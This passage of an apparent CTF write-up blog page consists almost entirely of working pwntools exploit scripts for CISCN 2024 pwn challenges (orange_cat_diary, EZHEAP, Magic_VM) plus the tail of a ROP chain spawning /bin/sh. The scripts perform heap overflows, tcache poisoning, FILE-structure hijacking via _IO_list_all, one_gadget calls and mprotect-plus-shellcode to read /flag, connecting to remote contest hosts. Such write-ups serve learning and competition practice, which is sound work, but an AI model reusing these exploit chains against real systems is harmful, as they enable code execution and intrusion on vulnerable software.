class="line">payload += (</span><br><span class="line">    p64_ex(rax)</span><br><span class="line">    + p64_ex(<span class="number">0</span>)</span><br><span class="line">    + p64_ex(rdi_6)</span><br><span class="line">    + p64_ex(<span class="number">0</span>)</span><br><span class="line">    + p64_ex(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">    + p64_ex(rsi)</span><br><span class="line">    + p64_ex(<span class="number">0x564000</span>)</span><br><span class="line">    + p64_ex(rdx)</span><br><span class="line">    + p64_ex(<span class="number">0x10</span>)</span><br><span class="line">    + p64_ex(syscall_ret)</span><br><span class="line">)</span><br><span class="line">payload += (</span><br><span class="line">    p64_ex(rax)</span><br><span class="line">    + p64_ex(<span class="number">59</span>)</span><br><span class="line">    + p64_ex(rdi_6)</span><br><span class="line">    + p64_ex(<span class="number">0x564000</span>)</span><br><span class="line">    + p64_ex(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">    + p64_ex(rsi)</span><br><span class="line">    + p64_ex(<span class="number">0</span>)</span><br><span class="line">    + p64_ex(rdx)</span><br><span class="line">    + p64_ex(<span class="number">0</span>)</span><br><span class="line">    + p64_ex(syscall_ret)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;mess&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    addr = <span class="string">&#x27;8.147.128.251:43478&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./orange_cat_diary&#x27;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">load_libc(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc: ELF = gift[<span class="string">&#x27;libc&#x27;</span>]</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./orange_cat_diary&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0xCAD)</span></span><br><span class="line"><span class="string">    b *$rebase(0xC52)</span></span><br><span class="line"><span class="string">    b *$rebase(0xE29)</span></span><br><span class="line"><span class="string">    b *$rebase(0xDAE)</span></span><br><span class="line"><span class="string">    b *$rebase(0xD57)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">len</span>, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Please input your choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">len</span>, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Please input your choice:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Please input your choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Please input your choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;name.&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;inkey&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64_ex(<span class="number">0xf91</span>))</span><br><span class="line">add(<span class="number">0x8a1</span>, <span class="string">b&#x27;i&#x27;</span>)</span><br><span class="line">add(<span class="number">0x8a1</span>, <span class="string">b&#x27;i&#x27;</span>)</span><br><span class="line">add(<span class="number">0x6b0</span>, <span class="string">b&#x27;\x78&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x3c4b78</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;i&#x27;</span>)</span><br><span class="line">dele()</span><br><span class="line">edit(<span class="number">8</span>, p64_ex(libc_base + <span class="number">0x3c4aed</span>))</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;i&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;i&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64_ex(get_current_one_gadget_from_libc()[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line">sla(<span class="string">b&#x27;Please input your choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;content:&#x27;</span>, <span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

<h1 id="EZHEAP"><a href="#EZHEAP" class="headerlink" title="EZHEAP"></a>EZHEAP</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    addr = <span class="string">&#x27;8.147.133.230:30034&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./EzHeap&#x27;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">load_libc(<span class="string">&#x27;/home/inkey/pwn/ciscn2024初赛/EzHeap/libc.so.6&#x27;</span>)</span><br><span class="line">libc: ELF = gift[<span class="string">&#x27;libc&#x27;</span>]</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./EzHeap&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x16B3)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1773)</span></span><br><span class="line"><span class="string">    b *$rebase(0x18CD)</span></span><br><span class="line"><span class="string">    b *$rebase(0x19B6)</span></span><br><span class="line"><span class="string">    b _IO_flush_all_lockp</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap = <span class="number">0x4060</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;inkey0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;inkey1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;inkey2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;inkey3&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x110</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x110</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x110</span>)</span><br><span class="line">heap_base = u64_ex(ru(<span class="string">b&#x27;Wel&#x27;</span>, drop=<span class="literal">True</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x110</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x108</span> + p64_ex(<span class="number">0x110</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;inkey1&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x118</span>,</span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">    + p64_ex(<span class="number">0x110</span>)</span><br><span class="line">    + p64_ex(protect_ptr(heap_base + <span class="number">0x420</span>, heap_base - <span class="number">0x1B70</span> - <span class="number">0x110</span>)),</span><br><span class="line">)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;inkey1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;inkey2&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x110</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x110</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x21ADC0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO_list_all = libc.sym._IO_list_all</span><br><span class="line">log_address_ex2(IO_list_all)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;inkey4&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">b&#x27;heap&#x27;</span>)</span><br><span class="line">fake_IO = heap_base + <span class="number">0x750</span></span><br><span class="line"></span><br><span class="line">edit(</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">0x2C0</span>,</span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x2A8</span></span><br><span class="line">    + p64_ex(<span class="number">0x20</span>)</span><br><span class="line">    + p64_ex(protect_ptr(heap_base + <span class="number">0x8C0</span>, IO_list_all - <span class="number">0x20</span>)),</span><br><span class="line">)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;inkey6&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;inkey7&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64_ex(fake_IO))</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc.sym._IO_wfile_jumps</span><br><span class="line">CG.set_find_area(<span class="literal">False</span>, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">orw = (</span><br><span class="line">    p64_ex(CG.pop_rdi_ret())</span><br><span class="line">    + p64_ex(fake_IO + <span class="number">0x280</span> - <span class="number">0x9d0</span>)</span><br><span class="line">    + p64_ex(CG.pop_rsi_ret())</span><br><span class="line">    + p64_ex(<span class="number">0x2000</span>)</span><br><span class="line">    + p64_ex(CG.pop_rdx_rbx_ret())</span><br><span class="line">    + p64_ex(<span class="number">0x7</span>) * <span class="number">2</span></span><br><span class="line">    + p64_ex(libc.sym.mprotect)</span><br><span class="line">    + p64_ex(fake_IO + <span class="number">0x280</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="number">3</span>, fake_IO + <span class="number">0x190</span>, <span class="number">0x50</span>) + shellcraft.write(<span class="number">1</span>, fake_IO + <span class="number">0x190</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x20</span>: p64_ex(libc_base + <span class="number">0xA0265</span>),</span><br><span class="line">        <span class="number">0x28</span>: p64_ex(libc_base + <span class="number">0xA0265</span> + <span class="number">0x100</span>),</span><br><span class="line">        <span class="number">0xA0</span>: p64_ex(fake_IO + <span class="number">0x20</span>),</span><br><span class="line">        <span class="number">0xD8</span>: p64_ex(_IO_wfile_jumps),</span><br><span class="line">        <span class="number">0x38</span>: p64_ex(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0x50</span>: p64_ex(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0x80</span>: p64_ex(libc_base + <span class="number">0x42946</span>),</span><br><span class="line">        <span class="number">0x100</span>: p64_ex(fake_IO + <span class="number">0x110</span>),</span><br><span class="line">        <span class="number">0x178</span>: p64_ex(libc_base + <span class="number">0x5A120</span>),</span><br><span class="line">        <span class="number">0x190</span>: <span class="string">b&#x27;/flag\x00&#x27;</span>,</span><br><span class="line">        <span class="number">0x1A0</span>: orw,</span><br><span class="line">        <span class="number">0x280</span>: shellcode,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x400</span>, payload)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="Magic-VM"><a href="#Magic-VM" class="headerlink" title="Magic_VM"></a>Magic_VM</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;160&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    addr = <span class="string">&#x27;8.147.133.80:15926&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./ezvm&#x27;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">load_libc(<span class="string">&#x27;/home/inkey/pwn/ciscn2024初赛/magic_vm/libc.so.6&#x27;</span>)</span><br><span class="line">libc: ELF = gift[<span class="string">&#x27;libc&#x27;</span>]</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./ezvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x181B)</span></span><br><span class="line"><span class="string">    b *$rebase(0x192D)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1B01)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b *$rebase(0x1CB2)</span></span><br><span class="line"><span class="string">    b _IO_flush_all_lockp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vm</span>(<span class="params">opcode, arg1=<span class="number">0</span>, arg2=<span class="number">0</span>, arg3=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    <span class="keyword">if</span> opcode == <span class="number">5</span>:</span><br><span class="line">        pay = flat(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="number">0x0</span>: p8_ex(opcode),</span><br><span class="line">                <span class="number">0x1</span>: p8_ex(arg1),</span><br><span class="line">                <span class="number">0x2</span>: p8_ex(arg2),</span><br><span class="line">                <span class="number">0x3</span>: arg3,</span><br><span class="line">            &#125;,</span><br><span class="line">            filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">9</span> <span class="keyword">or</span> opcode == <span class="number">10</span>:</span><br><span class="line">        pay = flat(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="number">0x0</span>: p8_ex(opcode),</span><br><span class="line">                <span class="number">0x1</span>: p8_ex(arg1),</span><br><span class="line">                <span class="number">0x2</span>: p8_ex(arg2),</span><br><span class="line">            &#125;,</span><br><span class="line">            filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">11</span>:</span><br><span class="line">        pay = flat(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="number">0x0</span>: p8_ex(opcode),</span><br><span class="line">            &#125;,</span><br><span class="line">            filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pay = flat(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="number">0x0</span>: p8_ex(opcode),</span><br><span class="line">                <span class="number">0x1</span>: p8_ex(arg1),</span><br><span class="line">                <span class="number">0x2</span>: p8_ex(arg2),</span><br><span class="line">                <span class="number">0x3</span>: arg3,</span><br><span class="line">            &#125;,</span><br><span class="line">            filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line">    payload += pay</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">type </span></span><br><span class="line"><span class="string">1:p64</span></span><br><span class="line"><span class="string">2:reg</span></span><br><span class="line"><span class="string">3:addr_off</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">arg1 type</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">opcode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1 +</span></span><br><span class="line"><span class="string">2 -</span></span><br><span class="line"><span class="string">3 &lt;&lt;</span></span><br><span class="line"><span class="string">4 &gt;&gt;</span></span><br><span class="line"><span class="string">5 =</span></span><br><span class="line"><span class="string">6 &amp;</span></span><br><span class="line"><span class="string">7 |</span></span><br><span class="line"><span class="string">8 ^</span></span><br><span class="line"><span class="string">9 POP</span></span><br><span class="line"><span class="string">10 PUSH</span></span><br><span class="line"><span class="string">11 init</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">cmd += <span class="string">&#x27;c\n&#x27;</span> * <span class="number">5</span></span><br><span class="line"></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0x225980</span> - <span class="number">0x2000</span>))</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">3</span> &lt;&lt; <span class="number">2</span>), <span class="number">3</span>, p8_ex(<span class="number">1</span>)) <span class="comment"># 0x7fa5ca334960 (__strnlen_avx2)</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">vm(<span class="number">2</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">3</span>, p64_ex(<span class="number">0x2220c0</span> - <span class="number">0x2000</span>)) <span class="comment"># 6</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>) <span class="comment"># reg3 --&gt; addr_base</span></span><br><span class="line"></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0x224680</span>)) <span class="comment"># 12</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">2</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p8_ex(<span class="number">3</span>)) <span class="comment"># addr --&gt; _IO_list_all</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 16 (17-1)</span></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0xd8</span>))</span><br><span class="line">vm(<span class="number">1</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">3</span>, p64_ex(<span class="number">0x2200c0</span>)) <span class="comment"># reg3 --&gt; _IO_wfile_jumps</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">2</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p8_ex(<span class="number">3</span>)) <span class="comment"># fake_IO + 0xd8 --&gt; reg3</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23</span></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0x368</span>))</span><br><span class="line">vm(<span class="number">2</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">3</span>, p64_ex(<span class="number">0x12b43f</span>)) <span class="comment"># reg3 --&gt; onegadget 0x12b43f</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">2</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p8_ex(<span class="number">3</span>)) <span class="comment"># fake_IO + 0x368 --&gt; reg3</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#30</span></span><br><span class="line">vm(<span class="number">2</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">3</span>, p64_ex(<span class="number">0xf4c81</span> - <span class="number">0x200</span>)) <span class="comment"># reg3 --&gt; fake_IO + 0x200</span></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0xa0</span>))</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">2</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p8_ex(<span class="number">3</span>)) <span class="comment"># fake_IO + 0xa0 --&gt; reg3</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 37</span></span><br><span class="line">vm(<span class="number">1</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">3</span>, p64_ex(<span class="number">0x100</span>)) <span class="comment"># reg3 --&gt; fake_IO + 0x300</span></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0x2e0</span>))</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">2</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p8_ex(<span class="number">3</span>)) <span class="comment"># fake_IO + 0x2e0 --&gt; reg3</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 44 + 3</span></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0x28</span>))</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0x1000</span>)) <span class="comment"># fake_IO + 0x28 --&gt; 0x1000</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>) <span class="comment"># 51</span></span><br><span class="line"></span><br><span class="line">vm(<span class="number">1</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">3</span>, p64_ex(<span class="number">0x59a70</span>)) <span class="comment"># reg3 --&gt; libc.sym.system</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0x368</span>))</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span 